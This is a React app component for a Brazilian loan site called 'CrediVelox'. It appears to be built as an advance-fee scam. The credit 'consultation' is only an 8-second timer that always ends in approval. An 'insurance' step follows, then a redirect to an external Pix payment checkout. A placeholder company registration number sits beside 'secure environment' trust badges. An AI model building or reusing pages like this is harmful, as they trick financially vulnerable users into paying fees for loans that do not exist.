import React, { useState } from 'react';
import { AppStep } from './types';
import StepForm from './components/StepForm';
import StepLoading from './components/StepLoading';
import StepApproved from './components/StepApproved';
import StepInsurance from './components/StepInsurance';
import { Wallet, ShieldCheck, Menu } from 'lucide-react';

const App: React.FC = () => {
  const [currentStep, setCurrentStep] = useState<AppStep>(AppStep.FORM);

  const handleStartConsultation = () => {
    setCurrentStep(AppStep.LOADING);
    // Simulate network/search delay of 8 seconds
    setTimeout(() => {
      setCurrentStep(AppStep.APPROVED);
    }, 8000);
  };

  const handleGoToInsurance = () => {
    setCurrentStep(AppStep.INSURANCE);
  };

  const handleFinalize = () => {
    window.location.href = 'https://pay.checkoutpixes.com/checkout/cmmqp606109y61ymygpuev28o?offer=Z5NELE5';
  };

  return (
    <div className="min-h-screen flex flex-col relative overflow-hidden bg-slate-50">
      
      {/* Background Decorative Elements */}
      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-green-200/40 rounded-full blur-[100px] pointer-events-none" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-blue-200/40 rounded-full blur-[100px] pointer-events-none" />

      {/* Professional Header */}
      <header className="bg-white/80 backdrop-blur-md border-b border-gray-200 sticky top-0 z-50">
        <div className="max-w-6xl mx-auto px-4 h-16 flex items-center justify-between">
          {/* Logo Brand */}
          <div className="flex items-center gap-2">
            <div className="bg-primary text-white p-1.5 rounded-lg">
              <Wallet size={24} />
            </div>
            <div className="flex flex-col leading-none">
              <span className="text-xl font-bold text-gray-800 tracking-tight">CrediVelox</span>
              <span className="text-[0.65rem] text-primary font-semibold uppercase tracking-wider">Soluções Financeiras</span>
            </div>
          </div>

          {/* Nav / Trust Indicators */}
          <div className="flex items-center gap-4 text-sm text-gray-600">
            <div className="hidden md:flex items-center gap-1">
              <ShieldCheck size={16} className="text-green-600" />
              <span>Ambiente Seguro</span>
            </div>
            <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <Menu size={24} className="text-gray-700" />
            </button>
          </div>
        </div>
      </header>

      {/* Main Content Area */}
      <main className="flex-1 flex items-center justify-center p-4 z-10">
        <div className="w-full max-w-[500px]">
          {currentStep === AppStep.FORM && (
            <StepForm onConsult={handleStartConsultation} />
          )}
          {currentStep === AppStep.LOADING && (
            <StepLoading />
          )}
          {currentStep === AppStep.APPROVED && (
            <StepApproved onContinue={handleGoToInsurance} />
          )}
          {currentStep === AppStep.INSURANCE && (
            <StepInsurance onFinalize={handleFinalize} />
          )}
        </div>
      </main>

      {/* Footer */}
      <footer className="py-6 text-center text-gray-400 text-xs z-10">
        <p>&copy; {new Date().getFullYear()} CrediVelox Financeira S.A. Todos os direitos reservados.</p>
        <p className="mt-1">CNPJ: 00.000.000/0001-00 • Av. Paulista, 1000 - São Paulo, SP</p>
      </footer>

    </div>
  );
};

export default App;